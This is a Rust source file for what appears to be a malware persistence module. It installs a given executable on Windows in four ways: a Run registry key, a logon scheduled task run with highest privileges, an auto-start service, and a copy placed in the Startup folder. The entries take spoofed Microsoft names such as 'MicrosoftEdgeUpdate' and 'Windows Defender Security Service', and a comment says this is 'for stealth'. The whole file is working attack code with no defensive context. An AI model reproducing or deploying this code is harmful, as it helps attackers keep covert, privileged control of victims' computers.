// Rust - Memory-safe, fast persistence mechanisms
use winreg::enums::*;
use winreg::RegKey;
use std::path::Path;
use std::env;

pub struct PersistenceManager;

impl PersistenceManager {
    pub fn install_all_methods(exe_path: &str) -> Result<(), Box<dyn std::error::Error>> {
        Self::registry_run_key(exe_path)?;
        Self::scheduled_task(exe_path)?;
        Self::service_install(exe_path)?;
        Self::startup_folder(exe_path)?;
        Ok(())
    }
    
    fn registry_run_key(exe_path: &str) -> Result<(), Box<dyn std::error::Error>> {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let run_key = hkcu.open_subkey_with_flags(
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            KEY_WRITE
        )?;
        
        run_key.set_value("WindowsSecurityUpdate", &exe_path)?;
        Ok(())
    }
    
    fn scheduled_task(exe_path: &str) -> Result<(), Box<dyn std::error::Error>> {
        // Use schtasks command for stealth
        let task_name = "MicrosoftEdgeUpdate";
        let cmd = format!(
            r#"schtasks /create /tn "{}" /tr "{}" /sc onlogon /rl highest /f"#,
            task_name, exe_path
        );
        
        std::process::Command::new("cmd")
            .args(&["/c", &cmd])
            .output()?;
        Ok(())
    }
    
    fn service_install(exe_path: &str) -> Result<(), Box<dyn std::error::Error>> {
        // Create Windows service for SYSTEM-level persistence
        let service_name = "WinDefendSec";
        let cmd = format!(
            r#"sc create {} binPath= "{}" start= auto DisplayName= "Windows Defender Security Service""#,
            service_name, exe_path
        );
        
        std::process::Command::new("cmd")
            .args(&["/c", &cmd])
            .output()?;
        Ok(())
    }
    
    fn startup_folder(exe_path: &str) -> Result<(), Box<dyn std::error::Error>> {
        let startup_path = env::var("APPDATA")? + r"\Microsoft\Windows\Start Menu\Programs\Startup";
        let dest = Path::new(&startup_path).join("update.exe");
        std::fs::copy(exe_path, dest)?;
        Ok(())
    }
}
